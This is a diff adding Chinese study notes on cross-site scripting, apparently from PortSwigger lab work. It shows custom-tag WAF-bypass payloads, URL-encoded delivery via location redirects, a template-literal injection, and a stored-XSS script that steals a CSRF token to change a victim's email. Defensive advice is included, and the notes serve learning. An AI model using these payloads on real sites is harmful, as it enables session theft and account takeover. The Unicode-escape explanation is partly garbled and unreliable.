@@ -955,6 +955,272 @@ element.innerHTML = comment.author;
 <iframe src="javascript:alert(1)">
 ```
 
+#### 自定义标签绕过 WAF
+
+##### 什么是自定义标签？
+
+自定义标签是指不符合标准 HTML 规范、由开发者自行创建和命名的 HTML 标签。它们不在 W3C 的 HTML 标准中定义，但浏览器仍然会解析和渲染它们。
+
+**基本示例：**
+
+```html
+<!-- 标准 HTML 标签 -->
+<div>这是标准标签</div>
+<p>这也是标准标签</p>
+
+<!-- 自定义标签 -->
+<my-custom-tag>这是自定义标签</my-custom-tag>
+<hello-world>你好，世界！</hello-world>
+<abc123>测试</abc123>
+```
+
+浏览器虽然不认识这些标签，但不会报错，只是将它们当作"未知元素"处理，默认以 `display: inline` 方式渲染。
+
+##### 自定义标签的特点
+
+| 特点 | 说明 |
+|------|------|
+| 不报错 | 浏览器不会因为遇到未知标签而停止解析 |
+| 可加属性 | 可以像标准标签一样添加 `id`、`class` 等属性 |
+| 可绑定事件 | 可以绑定 JavaScript 事件（如 `onclick`、`onmouseover` 等） |
+| DOM 操作 | 可以通过 JavaScript 动态创建、查询和操作 |
+| 默认样式 | 浏览器会给予默认的 `display: inline` 样式 |
+
+##### 在 XSS 攻击中的应用
+
+在 WAF 拦截了所有标准标签（如 `<script>`、`<img>`、`<body>` 等）的情况下，攻击者可以尝试使用自定义标签来绕过检测。
+
+**为什么可能绕过 WAF？**
+
+- WAF 通常维护一个"黑名单"，只拦截已知的危险标签（如 `<script>`、`<img>`、`<iframe>` 等）
+- 自定义标签不在黑名单中，WAF 可能认为它是无害的而放行
+- 事件属性（如 `onmouseover`）才是真正执行代码的，但 WAF 可能只检查标签名，忽略了事件属性
+
+##### 给自定义标签绑定事件
+
+**方式一：直接在标签内绑定（最常用）**
+
+```html
+<xss onfocus="alert(1)" tabindex="0">点击或聚焦我</xss>
+```
+
+关键点：直接使用 `onfocus` 属性绑定事件；必须添加 `tabindex` 属性，否则元素无法获得焦点；`tabindex="0"` 表示元素可以通过键盘 Tab 键获得焦点。
+
+**方式二：通过 JavaScript 绑定**
+
+```html
+<xss id="myXss">点击或聚焦我</xss>
+
+<script>
+    // 使用 addEventListener
+    document.getElementById('myXss').addEventListener('focus', function() {
+        alert(1);
+    });
+
+    // 或使用 onfocus 属性
+    // document.getElementById('myXss').onfocus = function() { alert(1); };
+</script>
+```
+
+**方式三：结合 autofocus 属性自动触发**
+
+```html
+<xss onfocus="alert(1)" tabindex="0" autofocus>自动聚焦触发</xss>
+```
+
+`autofocus` 让页面加载时自动聚焦到该元素，配合 `onfocus` 事件，可实现无需用户交互自动执行。
+
+**触发 onfocus 事件的方法汇总：**
+
+| 触发方式 | 说明 | 是否需要用户交互 |
+|---------|------|----------------|
+| 用户点击元素 | 鼠标点击 | 是 |
+| 用户按 Tab 键 | 键盘导航到元素 | 是 |
+| `autofocus` 属性 | 页面加载自动聚焦 | 否 |
+| `element.focus()` | JavaScript 手动聚焦 | 否 |
+
+##### tabindex 与 id 的作用
+
+以 payload `<xss id=x onfocus=alert(document.cookie) tabindex=1>` 为例，这两个属性各司其职：
+
+**`id=x` 的作用：** 为元素设置唯一标识符，用于 JavaScript 引用和 DOM 操作。
+
+| 用途 | 说明 |
+|------|------|
+| JavaScript 引用 | 可以通过 `document.getElementById('x')` 获取该元素 |
+| DOM 操作 | 可以手动控制该元素，如调用 `focus()` 使其获得焦点 |
+| URL 锚点 | URL 中的 `#x` 可以直接滚动到该元素位置 |
+
+**`tabindex` 的作用：** 让自定义标签可以获得焦点。自定义标签默认不可聚焦（不像 `<input>`、`<a>` 等表单元素天生可聚焦），没有 `tabindex` 则 `onfocus` 事件永远不会触发。
+
+| `tabindex` 值 | 含义 |
+|---------------|------|
+| `tabindex="0"` | 元素可聚焦，按 Tab 键顺序访问 |
+| `tabindex="1"` | 元素可聚焦，Tab 顺序排在所有 `tabindex="0"` 之前 |
+| `tabindex="-1"` | 元素可聚焦，但不能通过 Tab 键访问（只能通过 JavaScript `focus()`） |
+
+**对比验证：**
+
+```html
+<!-- 没有 tabindex：无法聚焦，onfocus 永远不会触发 -->
+<xss onfocus=alert(1)>无效</xss>
+
+<!-- 有 tabindex：可以聚焦，onfocus 可以触发 -->
+<xss onfocus=alert(1) tabindex=0>有效</xss>
+```
+
+**两者配合的完整攻击链：**
+
+| 属性 | 主要作用 | 在 XSS 攻击中的价值 |
+|------|---------|-------------------|
+| `id=x` | 标识元素，供 JavaScript 引用 | 让攻击者可以通过 `getElementById('x')` 精确操控该元素 |
+| `tabindex=1` | 让元素可聚焦 | 让 `onfocus` 事件可以被触发（没有它，`onfocus` 无效） |
+
+##### 攻击 payload 构造与 URL 编码
+
+**典型 payload：**
+
+```
+<xss id=x onfocus=alert(document.cookie) tabindex=1 autofocus>
+```
+
+**URL 编码后的 payload（用于通过 URL 参数投递）：**
+
+```
+%3Cxss%20id%3Dx%20onfocus%3Dalert(document.cookie)%20tabindex=1%20autofocus%3E
+```
+
+**编码对照表：**
+
+| 编码 | 解码后 | 说明 |
+|------|--------|------|
+| `%3C` | `<` | 小于号，标签开始 |
+| `%3E` | `>` | 大于号，标签结束 |
+| `%3D` | `=` | 等号 |
+| `%20` | 空格 | URL 中的空格编码 |
+| `%28` | `(` | 左括号 |
+| `%29` | `)` | 右括号 |
+
+**完整攻击 URL 示例：**
+
+```
+https://victim.com/?search=%3Cxss%20id%3Dx%20onfocus%3Dalert(document.cookie)%20tabindex=1%20autofocus%3E
+```
+
+##### 通过 location 跳转投递 payload
+
+`location` 是 JavaScript 中用于控制浏览器当前页面 URL 的对象，在 XSS 攻击中用于强制浏览器跳转到构造好的恶意 URL。
+
+**基本用法：**
+
+```html
+<script>
+location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+```
+
+**与其他跳转方式的对比：**
+
+| 方式 | 代码示例 | 特点 |
+|------|---------|------|
+| `location` | `location = 'url'` | 最简洁，直接赋值 |
+| `location.href` | `location.href = 'url'` | 与 `location` 等价，更明确 |
+| `location.assign()` | `location.assign('url')` | 标准方法，会留下历史记录 |
+| `location.replace()` | `location.replace('url')` | 不会留下历史记录（无法后退） |
+| `window.open()` | `window.open('url')` | 在新窗口/标签页打开 |
+
+**`location` 在攻击中的核心价值：**
+
+| 作用 | 说明 |
+|------|------|
+| 自动化 | 无需用户点击链接，脚本自动跳转 |
+| 精确投递 | 可以将攻击参数精确地放入 URL 中 |
+| 绕过限制 | 某些场景下，通过 `location` 跳转可以绕过 `<a>` 标签的限制 |
+
+**三种常见使用场景：**
+
+```html
+<!-- 场景1：攻击者自己的页面中使用 -->
+<script>
+location = 'https://victim.com/?search=<xss onfocus=alert(1) tabindex=0 autofocus>';
+</script>
+
+<!-- 场景2：通过注入点注入 -->
+<script>
+location = 'https://victim.com/?search=<xss onfocus=alert(1) tabindex=0 autofocus>';
+</script>
+
+<!-- 场景3：结合 onload 事件 -->
+<body onload="location='https://victim.com/?search=...'">
+```
+
+**关于 URL 锚点 `#x` 的说明：** URL 中的 `#x` 只会让浏览器**滚动**到 `id="x"` 的元素位置，**不会**自动触发 `onfocus` 事件。要让 `onfocus` 自动触发，必须使用 `autofocus` 属性或通过 JavaScript 调用 `focus()` 方法。
+
+**完整攻击流程：**
+
+```
+1. location 跳转到漏洞页面（携带注入 payload）
+   ->
+2. 页面反射搜索参数，浏览器解析出自定义标签 <xss>
+   ->
+3. autofocus 让元素自动获得焦点（或通过 JS 调用 focus()）
+   ->
+4. tabindex 使元素可聚焦，onfocus 事件触发
+   ->
+5. alert(document.cookie) 被执行，Cookie 泄露
+```
+
+##### 自定义标签与标准标签的对比
+
+| 对比项 | 标准标签 | 自定义标签 |
+|--------|---------|-----------|
+| 示例 | `<div>`, `<body>`, `<img>` | `<my-tag>`, `<abc>` |
+| 浏览器识别 | 是 | 否 |
+| 预定义样式/行为 | 有 | 无（继承默认） |
+| WAF 拦截概率 | 高（危险标签被重点监控） | 低（不在黑名单中） |
+| 兼容性 | 所有浏览器 | 现代浏览器支持，旧浏览器可能有问题 |
+| 事件绑定 | 支持 | 支持 |
+| 可访问性 | 好 | 差（屏幕阅读器无法理解） |
+
+##### Web Components 中的自定义标签
+
+在现代 Web 开发中，自定义标签是 Web Components 标准的一部分，被称为"自定义元素"（Custom Elements）。
+
+```javascript
+// 注册一个自定义标签
+class MyButton extends HTMLElement {
+    constructor() {
+        super();
+        this.innerHTML = `<button>点击我</button>`;
+    }
+}
+customElements.define('my-button', MyButton);
+```
+
+```html
+<!-- 使用自定义标签 -->
+<my-button></my-button>
+```
+
+这种情况下，自定义标签是有明确定义和功能的，不是攻击手段。
+
+##### 防御方法
+
+- **不要依赖黑名单：** 使用白名单机制，只允许已知安全的标签
+- **对用户输入进行严格过滤：** 使用成熟的 HTML 净化库（如 DOMPurify）
+- **内容安全策略（CSP）：** 限制可执行的脚本来源
+- **输出编码：** 将 `<` 和 `>` 编码为 `&lt;` 和 `&gt;`
+
+```javascript
+// 使用 DOMPurify 净化用户输入
+const clean = DOMPurify.sanitize(userInput, {
+    ALLOWED_TAGS: ['b', 'i', 'p', 'div'], // 只允许这些标签
+    ALLOWED_ATTR: ['class', 'id']          // 只允许这些属性
+});
+```
+
+**一句话总结：** 自定义标签是开发者自创的、不在 HTML 标准中的标签。在 XSS 攻击中，如果 WAF 只拦截标准危险标签，攻击者可能利用自定义标签配合事件属性（如 `onmouseover`）来绕过防御执行恶意代码。
+
 ### XSS 位于 HTML 标签属性中
 
 当 XSS 上下文在 HTML 标签属性值中时：
@@ -1183,6 +1449,100 @@ document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
 ${alert(document.domain)}
 ```
 
+#### 案例：Unicode 转义绕过 —— 模板字面量注入
+
+**Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**
+
+##### 漏洞概述
+
+此 Lab 的搜索功能将用户输入反射到 JavaScript 模板字面量内部。服务器对以下字符做了 Unicode 转义防御：
+
+| 字符 | 编码方式 | 编码结果 |
+|------|---------|---------|
+| `<` `>` | HTML 编码 | `&lt;` `&gt;` |
+| `'` `"` | HTML 编码 | `&quot;` `&#x27;` |
+| `\` | Unicode 转义 | `\\u005c` |
+| `` ` `` | Unicode 转义 | `\\u0060` |
+| `$` | Unicode 转义 | `\\u0024` |
+
+看起来防御很全面，但 `${` 组合仍然可以触发模板插值。Payload：`${alert(1)}`
+
+##### 核心原理
+
+浏览器先解析 HTML/JavaScript 语法结构，再执行编码转换。服务器把字符转义了，但 `$` 和 `{` 组合成的 `${` 是一个"语法标记"，Unicode 转义在语法解析阶段之后被还原，所以插值代码被执行。
+
+**关键洞察：** 服务器试图通过"字符转义"来防御"语法结构"，但浏览器在解析时先还原了转义字符，再识别语法结构，导致防御被绕过。
+
+##### 服务端代码还原
+
+假设后端代码（简化）如下：
+
+```javascript
+// 用户输入：${alert(1)}
+let userInput = 转义函数(用户输入);  // 转义后变成：${alert(1)}
+let html = `
+    <script>
+        var searchQuery = `用户输入`;  // 实际输出：var searchQuery = `${alert(1)}`;
+    </script>
+`;
+```
+
+服务器输出的最终 HTML：
+
+```html
+<script>
+    var searchQuery = `${alert(1)}`;
+</script>
+```
+
+##### 浏览器解析过程（两阶段）
+
+**阶段一：JavaScript 引擎解析 Unicode 转义。** `$` 被还原为字符 `$`，代码变为：
+
+```javascript
+var searchQuery = `${alert(1)}`;
+```
+
+**阶段二：JavaScript 引擎解析模板字面量语法。** 识别到 `${}` 插值表达式，执行 `alert(1)`。
+
+**为什么其他字符被转义不影响？**
+
+- `<>` 被 HTML 编码 -- 但在 `<script>` 标签内，HTML 编码不会被还原，所以不起作用
+- `'` `"` 被 HTML 编码 -- 同上，在 JS 上下文中不会被还原
+- `` ` `` 被 Unicode 转义为 ``` -- 这会阻止模板字面量的开始/结束，但攻击利用的是 `${}`，不需要反引号
+- 最致命的是：服务器转义了单独的 `$`，但没有意识到 `$` 和 `{` 的组合才是关键
+
+##### 数据流追踪
+
+```
+用户输入: ${alert(1)}
+    |
+    v
+服务器转义: ${alert(1)}
+    |
+    v
+浏览器收到: var searchQuery = `${alert(1)}`;
+    |
+    v
+JS 引擎步骤1 (Unicode 还原): var searchQuery = `${alert(1)}`;
+    |
+    v
+JS 引擎步骤2 (模板语法解析): 识别 ${}，执行 alert(1)
+```
+
+##### 技术术语总结
+
+| 概念 | 解释 |
+|------|------|
+| 模板字面量 | ES6 引入，用反引号包裹，支持 `${}` 插值 |
+| Unicode 转义 | `$` 是 `$` 的 Unicode 表示，JS 引擎会还原 |
+| 语法解析 vs 值解析 | 语法解析先于值解析，Unicode 转义在值解析阶段被还原 |
+| 二次解码 | 服务器编码一次，浏览器解码一次，导致防御失效 |
+
+##### 防御教训
+
+此漏洞的本质是：**转义发生在"字符串值"层面，而不是"语法结构"层面。** 要正确防御，需要理解浏览器解析的完整流程，不能依赖对单个字符的转义来阻止语法结构的形成。
+
 ### XSS 通过客户端模板注入
 
 某些网站使用客户端模板框架（如 AngularJS）动态渲染网页。如果它们以不安全的方式将用户输入嵌入这些模板中，攻击者可能能够注入其自己的恶意模板表达式，发起 XSS 攻击。
@@ -1253,6 +1613,141 @@ XSS 使攻击者能够执行几乎任何合法用户可以在网站上执行的�
 | **攻击范围** | 单个操作的请求伪造 | 以受害者身份执行任意操作 |
 
 > **关键洞察：** CSRF 令牌无法防御 XSS，因为 XSS 允许攻击者直接从响应中读取令牌值。
+
+#### 案例：存储型 XSS 窃取 CSRF 令牌更改邮箱
+
+**Lab: Exploiting XSS to bypass CSRF defenses**
+
+##### 漏洞概述
+
+此 Lab 的博客评论功能存在存储型 XSS 漏洞。目标：利用 XSS 窃取受害者的 CSRF 令牌，然后用该令牌更改受害者的邮箱地址。
+
+用户账户页面 `/my-account` 包含一个修改邮箱的功能：
+- 需要向 `/my-account/change-email` 发送 POST 请求，参数为 `email`
+- 页面包含一个隐藏的 CSRF 令牌：`<input name="token" type="hidden" value="...">`
+
+由于修改邮箱操作受 CSRF 令牌保护，单纯构造一个 POST 请求无法奏效。但 XSS 允许攻击者先读取页面内容获取有效令牌，再带着令牌发起修改请求，从而完全绕过 CSRF 防御。
+
+##### 攻击 Payload
+
+```javascript
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get', '/my-account', true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf=' + token + '&email=test@test.com')
+};
+```
+
+##### Payload 执行流程分解
+
+**第一步：发起 GET 请求获取用户账户页面**
+
+```javascript
+var req = new XMLHttpRequest();
+req.onload = handleResponse;   // 请求完成后调用 handleResponse
+req.open('get', '/my-account', true);  // 异步 GET 请求
+req.send();                    // 发送请求
+```
+
+浏览器以受害者身份向 `/my-account` 发起 GET 请求，响应中包含受害者的个人信息页面 HTML，其中包括修改邮箱的表单和 CSRF 令牌。
+
+**第二步：从响应中提取 CSRF 令牌**
+
+```javascript
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+```
+
+`this.responseText` 是 `/my-account` 页面的完整 HTML 源码。`match()` 方法使用正则表达式从 HTML 中提取 token 值：
+
+| 正则部分 | 含义 |
+|---------|------|
+| `name="csrf"` | 匹配 CSRF 令牌的 input name 属性 |
+| `value="(\w+)"` | 捕获 value 属性中的 token 值，`\w+` 匹配字母数字下划线 |
+| `[1]` | 取捕获组中的第一个分组（即 `(\w+)` 匹配到的实际 token 值） |
+
+**第三步：携带令牌发起修改邮箱的 POST 请求**
+
+```javascript
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf=' + token + '&email=test@test.com')
+```
+
+POST 请求体包含两个参数：
+- `csrf`：从上一步正则提取到的有效令牌，用于通过服务器的 CSRF 校验
+- `email`：攻击者指定的邮箱地址，受害者邮箱被改为该地址
+
+##### 攻击流程全景
+
+```
+受害者浏览博客评论
+    |
+    v
+浏览器执行注入的 <script>
+    |
+    v
+步骤1: XMLHttpRequest GET /my-account
+    |  (以受害者身份，携带受害者 Cookie)
+    v
+服务器返回用户页面 HTML (包含 CSRF token)
+    |
+    v
+步骤2: 正则提取 token
+    |  match(/name="csrf" value="(\w+)"/)[1]
+    v
+步骤3: XMLHttpRequest POST /my-account/change-email
+    |  请求体: csrf=<token>&email=test@test.com
+    v
+服务器校验 CSRF token 通过，邮箱被修改
+    |
+    v
+攻击者使用新邮箱发起密码重置，接管账户
+```
+
+##### 关键技术点
+
+**1. 为什么能绕过 CSRF 保护？**
+
+| 场景 | CSRF 令牌 | 攻击结果 |
+|------|----------|---------|
+| 纯 CSRF 攻击 | 攻击者不知道令牌值，无法伪造有效请求 | 失败 |
+| XSS + CSRF | XSS 脚本先读取页面中的令牌值，再携带令牌发起请求 | 成功 |
+
+CSRF 令牌的设计目的是防止跨站请求伪造：攻击者无法读取其他域下的页面内容（受同源策略限制），因此不知道令牌值。但 XSS 使恶意脚本在目标域下执行，同源策略不再构成障碍，脚本可以自由读取同源页面内容并提取令牌。
+
+**2. 异步请求与回调链**
+
+整个攻击通过两段异步 XMLHttpRequest 串联完成。`req.onload = handleResponse` 确保第一步（获取 token）完成后才执行第二步（修改邮箱）。如果 token 尚未获取就发起修改请求，请求会因缺少有效 token 而失败。
+
+**3. 时序问题与延迟的重要性**
+
+在实际利用中，CSRF 令牌的获取和后续请求之间存在时序依赖。如果受害页面上存在其他异步加载的脚本或 DOM 操作（例如 CSRF 令牌由 JavaScript 动态生成或刷新），可能出现以下情况：
+
+- 脚本执行时 token 尚未渲染到 DOM
+- token 在页面加载后被轮换（token rotation）
+- 页面元素加载顺序导致 `match()` 匹配失败
+
+此时需要在两个请求之间引入延迟（如使用 `setTimeout` 或在 `onreadystatechange` 中检查 `readyState`），确保 token 获取时间晚于其生成/渲染时间，早于其过期/轮换时间。
+
+**4. 为什么博客评论是理想的攻击载体？**
+
+存储型 XSS 的自包含特性使攻击不需要外部交付机制。任何访问博客文章并加载评论的用户都会自动执行恶意脚本，无需点击链接或进行任何交互。受害者当前已登录，Cookie 有效，攻击成功率最高。
+
+##### 与纯 CSRF 攻击的对比总结
+
+| 维度 | 纯 CSRF | XSS 绕过 CSRF |
+|------|--------|--------------|
+| 攻击方式 | 诱导受害者点击恶意链接/访问恶意页面 | 在目标站点注入恶意脚本 |
+| 获取令牌 | 无法获取（受同源策略保护） | 可读取页面 DOM，直接提取令牌值 |
+| 请求来源 | 跨站（第三方域），无有效令牌 | 同源（目标域），携带合法令牌 |
+| 防御效果 | CSRF 令牌有效阻止 | CSRF 令牌完全无效 |
+| 前置条件 | 受害者在目标站点已登录 | 存在 XSS 漏洞 + 受害者在目标站点已登录 |
 
 ---
 
